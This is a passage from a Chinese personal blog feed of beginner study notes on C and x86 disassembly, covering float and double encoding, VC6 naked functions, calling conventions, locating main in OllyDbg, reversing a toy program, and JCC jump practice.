src="/2019/10/20/C语言学习与反汇编（三）/images/15716732149036.jpg" srcset="/img/loading.gif" alt="-w382"></p><h4 id="double类型"><a href="#double类型" class="headerlink" title="double类型"></a>double类型</h4><p>前面讲解了单精度浮点类型的IEEE编码。double类型和float类型大同小异，只是double类型表示的范围更大，占用空间更多，是float类型所占用空间的两倍。当然，精准度也会更高。</p><p>double类型占8字节的内存空间，同样，最高位也用于表示符号，指数位占11位，剩<br>余42位用于表示位数。<br>在float中，指数位范围用8位表示，加127后用于判断指数符号。在double中，由于扩大了精度，因此指数范围使用11位正数表示，<strong>加1023后可用于指数符号判断</strong>。</p><p>double类型的IEEE编码转换过程与float 类型一样，可根据float类型的转换流程<br>来转换double类型。<br><img src="/2019/10/20/C语言学习与反汇编（三）/images/15717429314228.jpg" srcset="/img/loading.gif" alt="-w756"></p><h3 id="英文字符存储"><a href="#英文字符存储" class="headerlink" title="英文字符存储"></a>英文字符存储</h3><p>char x = ‘A’;<br>对于一个英文字符，编译器会自动查ASCII表获取其定义的7位二进制数，然后转换存储其16进制放入内存中。例：<br><img src="/2019/10/20/C语言学习与反汇编（三）/images/15717434285598.jpg" srcset="/img/loading.gif" alt="-w446"><br><img src="/2019/10/20/C语言学习与反汇编（三）/images/15717434479758.jpg" srcset="/img/loading.gif" alt="-w420"><br>补充：</p><ul><li>标准 ASCII 码使用 7 位二进制数来表示所有的大写和小写字母，数字 0 到 9、标点符号，以及在美式英语中使用的特殊控制字符。</li><li>ASCII 码使用指定的 7 位或 8 位二进制数组合来表示 128 或 256 种可能的字符。</li><li>扩展 ASCII 码允许将每个字符的第 8 位用于确定附加的 128 个特殊符号字符、外来语字母和图形符号。</li></ul><p>为什么不是八位二进制呢？因为其第一位都是0，没必要记录，在起初7位已经满足需求。</p>]]></content>
    
    <summary type="html">
    
      
      
        &lt;h1 id=&quot;C语言与反汇编学习（三）&quot;&gt;&lt;a href=&quot;#C语言与反汇编学习（三）&quot; class=&quot;headerlink&quot; title=&quot;C语言与反汇编学习（三）&quot;&gt;&lt;/a&gt;C语言与反汇编学习（三）&lt;/h1&gt;&lt;h2 id=&quot;前言&quot;&gt;&lt;a href=&quot;#前言&quot; class=&quot;
      
    
    </summary>
    
    
      <category term="c与汇编" scheme="http://chumen77.xyz/tags/c%E4%B8%8E%E6%B1%87%E7%BC%96/"/>
    
  </entry>
  
  <entry>
    <title>C语言与反汇编学习（二）</title>
    <link href="http://chumen77.xyz/2019/10/19/C%E8%AF%AD%E8%A8%80%E4%B8%8E%E5%8F%8D%E6%B1%87%E7%BC%96%E5%AD%A6%E4%B9%A0%EF%BC%88%E4%BA%8C%EF%BC%89/"/>
    <id>http://chumen77.xyz/2019/10/19/C语言与反汇编学习（二）/</id>
    <published>2019-10-19T15:49:13.000Z</published>
    <updated>2020-02-28T07:53:46.000Z</updated>
    
    <content type="html"><![CDATA[<h1 id="C语言与反汇编学习（二）"><a href="#C语言与反汇编学习（二）" class="headerlink" title="C语言与反汇编学习（二）"></a>C语言与反汇编学习（二）</h1><h2 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h2><p>本次主要学习一下c是如何变成汇编的，查找程序入口，调用约定，和主要练习使用__declspec(naked)裸函数实现部分简单的功能和完整的逆一个简单EXE成c语言。</p><h2 id="裸函数"><a href="#裸函数" class="headerlink" title="裸函数"></a>裸函数</h2><h3 id="什么是裸函数？"><a href="#什么是裸函数？" class="headerlink" title="什么是裸函数？"></a>什么是裸函数？</h3><pre><code>void __declspec(naked) Function()  {.....}</code></pre><p>在代码中申明函数后，编译时，除了入口参数压栈外，然后就是call这个函数，编译器不会为函数体生成任何代码。</p><h3 id="运行裸函数为什么会出错"><a href="#运行裸函数为什么会出错" class="headerlink" title="运行裸函数为什么会出错"></a>运行裸函数为什么会出错</h3><p>以上的裸函数运行后，因为编译器除了入口参数压栈外，然后就是call这个函数，不会给其生成任何的汇编代码，所以明显运行后其无法回到原来的主函数，然后堆栈是不平衡的。所以：</p><pre><code>void __declspec(naked) Function()  {    __asm ret}</code></pre><p>加一个ret就好了，不会再报错了。</p><h3 id="裸函数框架简单集合"><a href="#裸函数框架简单集合" class="headerlink" title="裸函数框架简单集合"></a>裸函数框架简单集合</h3><h4 id="无参数无返回值的函数框架"><a href="#无参数无返回值的函数框架" class="headerlink" title="无参数无返回值的函数框架"></a>无参数无返回值的函数框架</h4><pre><code>void __declspec(naked) Function()  {    __asm    {        push ebp        mov ebp,esp        sub esp,0x40        push ebx        push esi        push edi        lea edi,dword ptr ds:[ebp-0x40]        mov eax,0xCCCCCCCC        mov ecx,0x10        rep stosd        pop edi        pop edi        pop esi        pop ebx        mov esp,ebp        mov esp,ebp        ret    }}</code></pre><h4 id="有参数有返回值的函数框架"><a href="#有参数有返回值的函数框架" class="headerlink" title="有参数有返回值的函数框架"></a>有参数有返回值的函数框架</h4><pre><code>void __declspec(naked) Function()  {    __asm    {        push ebp        mov ebp,esp        sub esp,0x40        push ebx        push esi        push edi        lea edi,dword ptr ds:[ebp-0x40]        mov eax,0xCCCCCCCC        mov ecx,0x10        rep stosd        //主要功能        mov eax,dword ptr ds:[ebp+8]        add eax,dword ptr ds:[ebp+0xC]        pop edi        pop edi        pop esi        pop ebx        mov esp,ebp        mov esp,ebp        ret    }}</code></pre><h4 id="带局部变量的函数框架"><a href="#带局部变量的函数框架" class="headerlink" title="带局部变量的函数框架"></a>带局部变量的函数框架</h4><pre><code>void __declspec(naked) Function()  {    __asm    {        push ebp        mov ebp,esp        sub esp,0x40        push ebx        push esi        push edi        lea edi,dword ptr ds:[ebp-0x40]        mov eax,0xCCCCCCCC        mov ecx,0x10        rep stosd        //主要功能        mov dword ptr ds:[ebp-4],2        mov dword ptr ds:[ebp-8],3        mov eax,dword ptr ds:[ebp+8]        add eax,dword ptr ds:[ebp+0xC]        //注意汇编中局部变量的存放办法            pop edi        pop edi        pop esi        pop ebx        mov esp,ebp        mov esp,ebp        ret    }}</code></pre><p><strong>在练习中发现对局部变量在汇编中如何存放，如何体现有些生疏，特此记录一下。</strong></p><h3 id="针对裸函数的练习"><a href="#针对裸函数的练习" class="headerlink" title="针对裸函数的练习"></a>针对裸函数的练习</h3><p>目标是要实现以下功能：</p><pre><code>int plus(int x,int y,int z){    int a = 2;    int b = 3;    int c = 4;    return x+y+z+a+b+c;}</code></pre><p>代码：</p><pre><code>// Day2.cpp : Defines the entry point for the console application.//#include &quot;stdafx.h&quot;int __declspec(naked)  plus(int x,int y,int z){    __asm    {        push ebp        mov ebp,esp        sub esp,0x40    //开栈        push ebx        push esi        push edi        //保护现场        lea edi,dword ptr ds:[ebp-0x40]        mov ecx,0x10        mov eax,0xCCCCCCCC        rep stosd        //为缓冲区填充数据        //真正要执行的功能        //局部变量：EBP—4开始 参数：ebp+8开始        //ebp+4是eip 原来call下条语句        mov eax,0x2        mov dword ptr ds:[ebp-0x4],eax        mov eax,0x3        mov dword ptr ds:[ebp-0x8],eax        mov eax,0x4        mov dword ptr ds:[ebp-0x0C],eax  //放入局部变量        mov eax,dword ptr ds:[ebp+0x8]        add eax,dword ptr ds:[ebp+0x0C]        add eax,dword ptr ds:[ebp+0x10]        add eax,dword ptr ds:[ebp-0x4]        add eax,dword ptr ds:[ebp-0x8]        add eax,dword ptr ds:[ebp-0x0C]         mov dword ptr ds:[ebp-0x4],eax    //把计算结果放入栈中，下面主函数打印a时要用到        pop edi;        pop esi;        pop ebx;        mov esp,ebp        pop ebp        ret    }}int main(int argc, char* argv[]){    int a;    a=plus(6,7,8);    printf(&quot;%d\n&quot;,a);    return 0;}</code></pre><p>练习这个可以更加熟悉堆栈结构，参数、局部变量的位置。</p><h2 id="程序真正的入口"><a href="#程序真正的入口" class="headerlink" title="程序真正的入口"></a>程序真正的入口</h2><p>main 或WinMain 是“语法规定的用户入口”，而不是“应用程序入口”。应用程序入口通常是启动函数。</p><p>在OD中默认设置就是到winmain入口就暂停程序，其并不是主函数入口。其实每一种编译器都有自己一套的编译标准，在主函数启动前要做一些必要的准备工作，下面我分析的是vc6.0的。</p><h3 id="main-函数的识别与寻找"><a href="#main-函数的识别与寻找" class="headerlink" title="main 函数的识别与寻找"></a>main 函数的识别与寻找</h3><p><strong>只是vc++6.0</strong><br>main 函数被调用前要先调用的函数如下：</p><ul><li>GetVersion() </li><li>_heap_init() </li><li>GetCommandLineA() </li><li>_crtGetEnvironmentStringsA() </li><li>_setargv()</li><li>_setenvp()</li><li>_cinit()</li></ul><p><img src="/2019/10/19/C语言与反汇编学习（二）/images/15715025630158.jpg" srcset="/img/loading.gif" alt="-w414"><br>这些函数调用结束后就会调用main 函数，根据main 函数调用的特征，将3个参数压入栈内作为函数的参数。<br>所以在winmain停下后，可以一直单步调试，遇到call的时候，注意前方是不是有3个参数被压入栈了，是的话这个可以基本判断它call的就是main函数直接步过进去即可，但是这个也不是一定的，结合智能od的注释，注释有win内核函数调用就不要进入函数就可以了。</p><h2 id="函数调用约定"><a href="#函数调用约定" class="headerlink" title="函数调用约定"></a>函数调用约定</h2><p>常见的几种约定：<br><img src="/2019/10/19/C语言与反汇编学习（二）/images/15715066318478.jpg" srcset="/img/loading.gif" alt="-w355"></p><h3 id="cdecl"><a href="#cdecl" class="headerlink" title="cdecl"></a>cdecl</h3><p>使用VC++ (关闭优化选项)编译代码生成cdecl.exe文件后，使用OllyDbg调试:函数的参数1、2以逆序方式压人栈，<br>调用Plus(函数( 401014)后，使用ADD ESP,8命令整理栈。调用者main()函数直接清理其压入栈的函数参数，这样的方式即是cdecl。<br><img src="/2019/10/19/C语言与反汇编学习（二）/images/15715038333622.jpg" srcset="/img/loading.gif" alt="-w267"></p><h3 id="stdcall"><a href="#stdcall" class="headerlink" title="stdcall"></a>stdcall</h3><p>stdcall常用于win32 api，在往后的VB中很常见。这个是自身函数内部进行栈清理。若想使用stdcall方式编译源码，只要使用<code>_ stdcall</code>关键字即可。<br><img src="/2019/10/19/C语言与反汇编学习（二）/images/15715038140613.jpg" srcset="/img/loading.gif" alt="-w295"><br>栈的清理工作由add(函数中最后( 40100F)的RETN 8命令来执行。RETN 8命令的含义为RETN+POP 8字节，即返回后使ESP增加到指定大小。</p><p>像这样在被调用者add)函数内部清理栈的方式即为stdcall方式。stdcall方式的好处在于， <strong>被调用者函数内部存在着栈清理代码，与每次调用函数时都要用ADD ESP,XXX命令的cdecI方式相比，代码尺寸要小</strong>。</p><p><strong>虽然Win 32 API是使用C语言编写的库，但它使用的是stdcall方式，而不是C语言默认的cdecl方式。</strong>这是为了获得更好的兼容性，使C语言之外的其他语言( Delphi(Pascal)、Visual Basic等)也能直接调用API。</p><h3 id="fastcall"><a href="#fastcall" class="headerlink" title="fastcall"></a>fastcall</h3><p>fastcal方式与stdcall方式基本类似，但该方式通常会使用寄存器(而非栈内存)去传递那些需要传递给函数的部分参数(前2个)。若某函数有4个参数，则前2个参数分别使用ECX、EDX寄存器传递。</p><p>顾名思义，fastcall方式的优势在于可以实现对函数的快速调用(从CPU的立场看，访问寄存器的速度要远比内存快得多)。单从函数调用本身来看，fastcall方式非常快，但是有时需要额外的系统开销来管理ECX、EDX寄存器。倘若调用函数前ECX与EDX中存有重要数据，那么使用它们前必须先备份。此外,如果函数本身很复杂，需要把ECX、EDX寄存器用作其他用途时，也需要将它们中的参数值存储到另外某个地方。有舍也有得。</p><p><img src="/2019/10/19/C语言与反汇编学习（二）/images/15715042971030.jpg" srcset="/img/loading.gif" alt="-w292"><br>就跟这种情况，一定要注意其是直接用寄存器来传参和计算的，不涉及栈，不过这个不常用。<br><img src="/2019/10/19/C语言与反汇编学习（二）/images/15715043849420.jpg" srcset="/img/loading.gif" alt="-w330"><br>这个就是常用的情况，传参的时候会把部分的参数用寄存器来传。</p><h2 id="第一次完整逆一个exe（CallingConvention-exe）"><a href="#第一次完整逆一个exe（CallingConvention-exe）" class="headerlink" title="第一次完整逆一个exe（CallingConvention.exe）"></a>第一次完整逆一个exe（CallingConvention.exe）</h2><h3 id="汇编分析"><a href="#汇编分析" class="headerlink" title="汇编分析"></a>汇编分析</h3><p><img src="/2019/10/19/C语言与反汇编学习（二）/images/15715046760959.jpg" srcset="/img/loading.gif" alt="-w855"><br>简单一看，这个就是停在winmain入口了，注意寻找前面所说的那个找call之前有3个参数压栈最为函数参数的语句，一直单步走：<br><img src="/2019/10/19/C语言与反汇编学习（二）/images/15715049691652.jpg" srcset="/img/loading.gif" alt="-w679"><br>疑似出现符合的情况，这时候按<code>F7</code>进去查看内部：<br><img src="/2019/10/19/C语言与反汇编学习（二）/images/15715050273427.jpg" srcset="/img/loading.gif" alt="-w535"><br>简单一看，就是我们要找的main函数。<br><strong>接下来为了加强分析可观性，我把汇编代码都放进了WPS中进行分析</strong>：<br><img src="/2019/10/19/C语言与反汇编学习（二）/images/15715051301041.jpg" srcset="/img/loading.gif" alt="-w1307"><br><img src="/2019/10/19/C语言与反汇编学习（二）/images/15715051770389.jpg" srcset="/img/loading.gif" alt="-w1311"><br><img src="/2019/10/19/C语言与反汇编学习（二）/images/15715052426371.jpg" srcset="/img/loading.gif" alt="-w1254"><br>（箭头指的不是特别好……）</p><h3 id="逆成c代码"><a href="#逆成c代码" class="headerlink" title="逆成c代码"></a>逆成c代码</h3><pre><code>#include &quot;stdafx.h&quot;int __stdcall plus2(int a,int b,int c){    return a+b+c;}int __cdecl plus3(int a,int b){    return a+b;}int __fastcall plus(int a,int b,int c,int d,int e){    int z,s;    z=plus2(a,b,c);    s=plus3(b,a);    return plus3(z,s);}int main(int argc, char* argv[]){    int x;    x=plus(1,3,4,6,7);    printf(&quot;%d\n&quot;,x);    return 0;}</code></pre><p>这个练习过程其实是十分艰难的，我分析了有一个小时左右，主要是</p><ul><li>开始对局部变量有些生疏，函数内部定义一个变量后汇编中会如何显示、</li><li>fastcall的认识不是很好</li><li>传入的<code>6 7</code>做了什么也不是很清楚<br>最后结合ida生成的伪代码才完成，不过经过这个练习都学到了很多，使用ida也感受到了ida的强大，学到了在其中如何看一些简单的函数以及其与真正汇编代码的区别。</li></ul>]]></content>
    
    <summary type="html">
    
      
      
        &lt;h1 id=&quot;C语言与反汇编学习（二）&quot;&gt;&lt;a href=&quot;#C语言与反汇编学习（二）&quot; class=&quot;headerlink&quot; title=&quot;C语言与反汇编学习（二）&quot;&gt;&lt;/a&gt;C语言与反汇编学习（二）&lt;/h1&gt;&lt;h2 id=&quot;前言&quot;&gt;&lt;a href=&quot;#前言&quot; class=&quot;
      
    
    </summary>
    
    
      <category term="c与汇编" scheme="http://chumen77.xyz/tags/c%E4%B8%8E%E6%B1%87%E7%BC%96/"/>
    
  </entry>
  
  <entry>
    <title>C语言与反汇编学习（一）</title>
    <link href="http://chumen77.xyz/2019/10/19/C%E8%AF%AD%E8%A8%80%E4%B8%8E%E5%8F%8D%E6%B1%87%E7%BC%96%E5%AD%A6%E4%B9%A0%EF%BC%88%E4%B8%80%EF%BC%89/"/>
    <id>http://chumen77.xyz/2019/10/19/C语言与反汇编学习（一）/</id>
    <published>2019-10-19T02:26:17.000Z</published>
    <updated>2020-02-28T07:53:48.000Z</updated>
    
    <content type="html"><![CDATA[<h1 id="C语言与反汇编学习（一）"><a href="#C语言与反汇编学习（一）" class="headerlink" title="C语言与反汇编学习（一）"></a>C语言与反汇编学习（一）</h1><h2 id="前言："><a href="#前言：" class="headerlink" title="前言："></a>前言：</h2><p>本课主要学习VC开发环境的简单使用，和几个函数反汇编分析。</p><h2 id="简单下熟悉VC6开发环境"><a href="#简单下熟悉VC6开发环境" class="headerlink" title="简单下熟悉VC6开发环境"></a>简单下熟悉VC6开发环境</h2><p>这里我直接用了编程达人的vc虚拟机，官方的vc6.0不是很好用，每次只支持调试一次，人家的可以突破这个限制。</p><h3 id="创建项目"><a href="#创建项目" class="headerlink" title="创建项目"></a>创建项目</h3><p><img src="/2019/10/19/C语言与反汇编学习（一）/images/15714523427592.jpg" srcset="/img/loading.gif" alt="-w911"></p><h3 id="执行过程"><a href="#执行过程" class="headerlink" title="执行过程"></a>执行过程</h3><p>代码编写–&gt;生成EXE(F7)–&gt;运行(F5)–&gt;结束运行(Shift+F5)</p><h3 id="一些简单操作"><a href="#一些简单操作" class="headerlink" title="一些简单操作"></a>一些简单操作</h3><h4 id="设置断点"><a href="#设置断点" class="headerlink" title="设置断点"></a>设置断点</h4><p><strong>设置断点</strong>是光标放到哪行代码后按下<code>F9</code>即可，这也是后面很多操作的最重要的起初操作。<br><img src="/2019/10/19/C语言与反汇编学习（一）/images/15714525807811.jpg" srcset="/img/loading.gif" alt="-w338"></p><h4 id="调出寄存器，栈，内存窗口"><a href="#调出寄存器，栈，内存窗口" class="headerlink" title="调出寄存器，栈，内存窗口"></a>调出寄存器，栈，内存窗口</h4><p><strong>调出寄存器，栈，内存窗口</strong><img src="/2019/10/19/C语言与反汇编学习（一）/images/15714528282225.jpg" srcset="/img/loading.gif" alt="-w586"><br>看图，在空白处右击点击一下你需要的窗口就好了。<br><img src="/2019/10/19/C语言与反汇编学习（一）/images/15714528997602.jpg" srcset="/img/loading.gif" alt="-w526"></p><h4 id="进入反汇编窗口"><a href="#进入反汇编窗口" class="headerlink" title="进入反汇编窗口"></a>进入反汇编窗口</h4><p>在程序运行时，且有适当断点的时候，看图<br><img src="/2019/10/19/C语言与反汇编学习（一）/images/15714530279259.jpg" srcset="/img/loading.gif" alt="-w517"></p><p>右击程序框内的空白处，然后点击GO to Disassembly 就好了。在这里面最重要的操作就是：<code>F10 F11</code>分别是步过和步入。这个跟od里不一样。</p><h2 id="C语言的调用"><a href="#C语言的调用" class="headerlink" title="C语言的调用"></a>C语言的调用</h2><p>1、无参数，无返回值的函数调用<br>2、有参数，无返回值的函数调用<br>3、无参数，有返回值的函数调用<br>4、有参数，有返回值的函数调用</p><h2 id="函数的反汇编分析-空函数"><a href="#函数的反汇编分析-空函数" class="headerlink" title="函数的反汇编分析-空函数"></a>函数的反汇编分析-空函数</h2><h3 id="先上c："><a href="#先上c：" class="headerlink" title="先上c："></a>先上c：</h3><pre><code>#include &quot;stdafx.h&quot;void Function(){}int main(int argc, char* argv[]){    Function()    return 0;}</code></pre><h3 id="反汇编分析："><a href="#反汇编分析：" class="headerlink" title="反汇编分析："></a>反汇编分析：</h3><p><img src="/2019/10/19/C语言与反汇编学习（一）/images/15714535234194.jpg" srcset="/img/loading.gif" alt="-w438"></p><h2 id="函数的反汇编分析-简单功能"><a href="#函数的反汇编分析-简单功能" class="headerlink" title="函数的反汇编分析-简单功能"></a>函数的反汇编分析-简单功能</h2><h3 id="两个数相加："><a href="#两个数相加：" class="headerlink" title="两个数相加："></a>两个数相加：</h3><h4 id="c代码："><a href="#c代码：" class="headerlink" title="c代码："></a>c代码：</h4><pre><code>#include &quot;stdafx.h&quot;void Plus(int x,int y){    return x+y;}int main(int argc, char* argv[]){    Plus(2,1);    return 0;}</code></pre><h4 id="反汇编分析：-1"><a href="#反汇编分析：-1" class="headerlink" title="反汇编分析："></a>反汇编分析：</h4><p><img src="/2019/10/19/C语言与反汇编学习（一）/images/15714537632825.jpg" srcset="/img/loading.gif" alt="-w709"></p><h3 id="三个数相加："><a href="#三个数相加：" class="headerlink" title="三个数相加："></a>三个数相加：</h3><h4 id="c代码：-1"><a href="#c代码：-1" class="headerlink" title="c代码："></a>c代码：</h4><pre><code>#include &quot;stdafx.h&quot;void Plus(int x,int y，int z){    return x+y;}int main(int argc, char* argv[]){    Plus(2,1,3);    return 0;}</code></pre><h4 id="反汇编分析：-2"><a href="#反汇编分析：-2" class="headerlink" title="反汇编分析："></a>反汇编分析：</h4><p><img src="/2019/10/19/C语言与反汇编学习（一）/images/15714539277702.jpg" srcset="/img/loading.gif" alt="-w974"><br>（和上面那个基本一样，只是为了练习，不详细写了）</p><h2 id="函数的反汇编分析-嵌套调用"><a href="#函数的反汇编分析-嵌套调用" class="headerlink" title="函数的反汇编分析-嵌套调用"></a>函数的反汇编分析-嵌套调用</h2><p>要求：编写一个函数，能够实现对任意5个整数实现加法(使用Plus1和Plus2).</p><h3 id="c代码"><a href="#c代码" class="headerlink" title="c代码"></a>c代码</h3><pre><code>#include &quot;stdafx.h&quot;int Plus1(int x,int y){    return x+y;}int Plus2(int x,int y,int z){    return x+y+z;}int Plus3(int a,int b,int c,int d,int e){    int i,j,m;    i=Plus1(a,b);    j=Plus2(c,d,e);    m=Plus1(i,j);    return m;}int main(int argc, char* argv[]){    Plus3(2,1,3,1,5);    return 0;}</code></pre><h3 id="反汇编分析：-3"><a href="#反汇编分析：-3" class="headerlink" title="反汇编分析："></a>反汇编分析：</h3><p><img src="/2019/10/19/C语言与反汇编学习（一）/images/15714541318519.jpg" srcset="/img/loading.gif" alt="-w1534"><br>（中间调用一个Plus1 和 Plus2，就不必进入分析了，基本跟前面简单分析那两个一样，这个练习是顺成下来的。）</p><h2 id="总结："><a href="#总结：" class="headerlink" title="总结："></a>总结：</h2><p>学完汇编了，就接着C与汇编结合分析，步步把常见的结合分析完。这次学习与练习，可以一整段一整段的读汇编代码了，<strong>（这个前面其实还有画过堆栈图，当时是一句句分析学习的，为了熟悉堆栈和汇编语句，找时间补下笔记</strong>）也熟悉了函数是如何嵌套调用的。</p>]]></content>
    
    <summary type="html">
    
      
      
        &lt;h1 id=&quot;C语言与反汇编学习（一）&quot;&gt;&lt;a href=&quot;#C语言与反汇编学习（一）&quot; class=&quot;headerlink&quot; title=&quot;C语言与反汇编学习（一）&quot;&gt;&lt;/a&gt;C语言与反汇编学习（一）&lt;/h1&gt;&lt;h2 id=&quot;前言：&quot;&gt;&lt;a href=&quot;#前言：&quot; class
      
    
    </summary>
    
    
      <category term="c与汇编" scheme="http://chumen77.xyz/tags/c%E4%B8%8E%E6%B1%87%E7%BC%96/"/>
    
  </entry>
  
  <entry>
    <title>JCC学习</title>
    <link href="http://chumen77.xyz/2019/10/07/JCC/"/>
    <id>http://chumen77.xyz/2019/10/07/JCC/</id>
    <published>2019-10-07T15:09:50.000Z</published>
    <updated>2020-02-28T07:53:54.000Z</updated>
    
    <content type="html"><![CDATA[<h1 id="JCC学习"><a href="#JCC学习" class="headerlink" title="JCC学习"></a>JCC学习</h1><h2 id="JCC指令集合"><a href="#JCC指令集合" class="headerlink" title="JCC指令集合"></a>JCC指令集合</h2><h3 id="详细"><a href="#详细" class="headerlink" title="详细__"></a>详细__</h3><p>1、JE, JZ　　　　　　结果为零则跳转(相等时跳转)　　　　 　　 ZF=1</p><p>2、JNE, JNZ　　  　　结果不为零则跳转(不相等时跳转) 　　　　   ZF=0</p><p>3、JS　　　　　　　  结果为负则跳转　　　　　　　　　　　　    SF=1</p><p>4、JNS 　　　　　　  结果为非负则跳转　　　　　　　　　　　   SF=0</p><p>5、JP, JPE　　　　　 结果中1的个数为偶数则跳转　　　　　　      PF=1</p><p>6、JNP, JPO　　　　  结果中1的个数为偶数则跳转　　　　　　      PF=0</p><p>7、JO　　　　　　　  结果溢出了则跳转　　　　　　　　　　      OF=1</p><p>8、JNO 　　　　　　  结果没有溢出则跳转　　　　　　　　            OF=0</p><p>9、JB, JNAE 　　　　 小于则跳转 (无符号数)　　　　　　　　　   CF=1</p><p>10、JNB, JAE 　　　  大于等于则跳转 (无符号数)　　　　　　　   CF=0</p><p>11、JBE, JNA  　　　 小于等于则跳转 (无符号数)　　　　　　　  CF=1 or ZF=1</p><p>12、JNBE, JA 　　　  大于则跳转(无符号数)　　　　　　　　　  CF=0 and ZF=0</p><p>13、JL, JNGE 　　　  小于则跳转 (<strong>有符号数</strong>)　　　　　　　　    SF≠ OF</p><p>14、JNL, JGE　　　   大于等于则跳转 (<strong>有符号数</strong>)　　　　　　    SF=OF</p><p>15、JLE, JNG  　　　 小于等于则跳转 (<strong>有符号数</strong>)　　　　　　    ZF=1 or SF≠ OF</p><p>16、JNLE, JG 　　　  大于则跳转(<strong>有符号数</strong>)　　　　　　　　     ZF=0 and SF=OF</p><h3 id="表格总结"><a href="#表格总结" class="headerlink" title="表格总结"></a>表格总结</h3><p><img src="/2019/10/07/JCC/images/15713086707312.jpg" srcset="/img/loading.gif" alt="-w1067"></p><p>直接摘抄的做的很详细，正好有助记，但是需要和上面详细指令搭配使用，要<strong>注意那些有符号的JCC跳转指令，</strong>因为在这个表里没有体现。也不用太着急背，熟悉一下就可以了，有部分是可以直接记住的，在往后遇到模糊的直接查下就可以了。</p><h3 id="注意："><a href="#注意：" class="headerlink" title="注意："></a>注意：</h3><p><strong>JCC指令决定它跳不跳转跟别的没关系，只跟EFLAG标志寄存器有关系，根据符号位来进行跳转的</strong></p><h2 id="练习"><a href="#练习" class="headerlink" title="练习"></a>练习</h2><h3 id="使用汇编指令修改标志寄存器中的某个位的值，实现JCC的十六种跳转"><a href="#使用汇编指令修改标志寄存器中的某个位的值，实现JCC的十六种跳转" class="headerlink" title="使用汇编指令修改标志寄存器中的某个位的值，实现JCC的十六种跳转."></a>使用汇编指令修改标志寄存器中的某个位的值，实现JCC的十六种跳转.</h3><p>前提：能用CMP和TEST实现的优先考虑.</p><h4 id="1、JE-JZ-结果为零则跳转-相等时跳转-ZF-1"><a href="#1、JE-JZ-结果为零则跳转-相等时跳转-ZF-1" class="headerlink" title="1、JE, JZ 结果为零则跳转(相等时跳转) ZF=1"></a>1、JE, JZ 结果为零则跳转(相等时跳转) ZF=1</h4><pre><code>MOV AL,1MOV CL,1CMP AL,CLJE 0X0040102B</code></pre><h4 id="2、JNE-JNZ-结果不为零则跳转-不相等时跳转-ZF-0"><a href="#2、JNE-JNZ-结果不为零则跳转-不相等时跳转-ZF-0" class="headerlink" title="2、JNE, JNZ 结果不为零则跳转(不相等时跳转) ZF=0"></a>2、JNE, JNZ 结果不为零则跳转(不相等时跳转) ZF=0</h4><pre><code>MOV AL,1TEST AL,ALJNZ 0X00401006</code></pre><h4 id="3、-JS-结果为负则跳转-SF-1"><a href="#3、-JS-结果为负则跳转-SF-1" class="headerlink" title="3、 JS 结果为负则跳转 SF=1"></a>3、 JS 结果为负则跳转 SF=1</h4><pre><code>MOV AL,1MOV CL,2CMP AL,CL</code></pre><h4 id="4、-JNS-结果为非负则跳转-SF-0"><a href="#4、-JNS-结果为非负则跳转-SF-0" class="headerlink" title="4、 JNS 结果为非负则跳转 SF=0"></a>4、 JNS 结果为非负则跳转 SF=0</h4><pre><code>XOR EAX,EAXJNS 0X0040102F</code></pre><h4 id="5、-JP-JPE-结果中1的个数为偶数则跳转-PF-1"><a href="#5、-JP-JPE-结果中1的个数为偶数则跳转-PF-1" class="headerlink" title="5、 JP, JPE 结果中1的个数为偶数则跳转 PF=1"></a>5、 JP, JPE 结果中1的个数为偶数则跳转 PF=1</h4><pre><code>MOV AL,2MOV CL,2CMP AL,CLJPE 0X00401008</code></pre><h4 id="6、JNP-JPO-结果中1的个数为奇数则跳转-PF-0"><a href="#6、JNP-JPO-结果中1的个数为奇数则跳转-PF-0" class="headerlink" title="6、JNP, JPO 结果中1的个数为奇数则跳转 PF=0"></a>6、JNP, JPO 结果中1的个数为奇数则跳转 PF=0</h4><pre><code>MOV AL,2MOV CL,1CMP AL,CLJPE 0X00401008</code></pre><h4 id="7、-JO-结果溢出了则跳转-OF-1"><a href="#7、-JO-结果溢出了则跳转-OF-1" class="headerlink" title="7、 JO 结果溢出了则跳转 OF=1"></a>7、 JO 结果溢出了则跳转 OF=1</h4><pre><code>MOV AL,80SUB AL,10JO 0X00401008</code></pre><h4 id="8、-JNO-结果没有溢出则跳转-OF-0"><a href="#8、-JNO-结果没有溢出则跳转-OF-0" class="headerlink" title="8、 JNO 结果没有溢出则跳转 OF=0"></a>8、 JNO 结果没有溢出则跳转 OF=0</h4><pre><code>MOV AX,0FFFFADD AX,80JNO 0X00401010</code></pre><h4 id="9、-JB-JNAE-小于则跳转-无符号数-CF-1"><a href="#9、-JB-JNAE-小于则跳转-无符号数-CF-1" class="headerlink" title="9、 JB, JNAE 小于则跳转 (无符号数) CF=1"></a>9、 JB, JNAE 小于则跳转 (无符号数) CF=1</h4><pre><code>MOV AX,80MOV CX,90CMP AX,CXJB 0X0040103E</code></pre><h4 id="10、-JNB-JAE-大于等于则跳转-无符号数-CF-0"><a href="#10、-JNB-JAE-大于等于则跳转-无符号数-CF-0" class="headerlink" title="10、 JNB, JAE 大于等于则跳转 (无符号数) CF=0"></a>10、 JNB, JAE 大于等于则跳转 (无符号数) CF=0</h4><pre><code>MOV AX,80MOV CX,90CMP CX,AXJB 0X00401044</code></pre><h4 id="11、-JBE-JNA-小于等于则跳转-无符号数-CF-1-or-ZF-1"><a href="#11、-JBE-JNA-小于等于则跳转-无符号数-CF-1-or-ZF-1" class="headerlink" title="11、 JBE, JNA 小于等于则跳转 (无符号数) CF=1 or ZF=1"></a>11、 JBE, JNA 小于等于则跳转 (无符号数) CF=1 or ZF=1</h4><p>一种直接跟练习9一样直接构造让CF=1或者让跟练习1让ZF=0就可以了。<br>    MOV AL,1<br>    MOV CL,1<br>    CMP AL,CL<br>    JE 0X0040102B<br>或者</p><pre><code>MOV AX,80MOV CX,90CMP AX,CXJB 0X0040103E</code></pre><h4 id="12、-JNBE-JA-大于则跳转-无符号数-CF-0-and-ZF-0"><a href="#12、-JNBE-JA-大于则跳转-无符号数-CF-0-and-ZF-0" class="headerlink" title="12、 JNBE, JA 大于则跳转(无符号数) CF=0 and ZF=0"></a>12、 JNBE, JA 大于则跳转(无符号数) CF=0 and ZF=0</h4><pre><code>MOV AX,80MOV CX,90CMP CX,AXJB 0X00401044</code></pre><p>解析：</p><p>这个与练习10的区别就是不可以让两个数相等。</p><h4 id="13、-JL-JNGE-小于则跳转-有符号数-SF≠-OF"><a href="#13、-JL-JNGE-小于则跳转-有符号数-SF≠-OF" class="headerlink" title="13、 JL, 